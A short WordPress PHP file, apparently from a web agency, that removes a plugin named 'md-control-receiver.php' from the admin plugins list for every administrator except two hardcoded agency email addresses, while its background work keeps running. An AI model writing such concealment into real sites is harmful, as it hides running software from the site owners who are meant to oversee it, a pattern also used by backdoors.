<?php

function md_control_can_manage() {
    if (!current_user_can('manage_options')) {
        return false;
    }

    $user = wp_get_current_user();
    return in_array(strtolower($user->user_email ?? ''), [
        'evan@matthewsdesign.co',
        'webdev@matthewsdesign.co',
    ], true);
}

// Filter the admin table only; leave update discovery and background work intact.
add_filter('all_plugins', function ($plugins) {
    if (!md_control_can_manage()) {
        unset($plugins[plugin_basename(dirname(__DIR__, 2) . '/md-control-receiver.php')]);
    }
    return $plugins;
});
